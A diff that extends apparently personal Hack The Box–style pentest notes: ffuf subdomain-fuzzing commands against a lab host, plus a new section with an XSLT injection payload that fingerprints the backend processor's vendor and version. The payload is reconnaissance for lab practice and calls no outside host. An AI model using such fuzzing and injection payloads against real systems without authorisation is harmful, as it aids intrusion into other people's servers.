@@ -49,3 +49,27 @@ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.
 Filter out a specific response code with -fc 
 
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://10.10.11.98 -H "Host: FUZZ.monitorsfour.htb" -c -fc 301
+
+## XXE Enumeration
+
+See the backend web tech.
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:output method="html" indent="yes" />
+
+  <xsl:template match="/">
+    <html>
+        <body>
+          <h1>System Fingerprint</h1>
+          <ul>
+            <li><b>Vendor:</b> <xsl:value-of select="system-property('xsl:vendor')"/></li>
+            <li><b>Vendor URL:</b> <xsl:value-of select="system-property('xsl:vendor-url')"/></li>
+            <li><b>XSLT Version:</b> <xsl:value-of select="system-property('xsl:version')"/></li>
+          </ul>
+        </body>
+      </html>
+  </xsl:template>
+</xsl:stylesheet>
+```
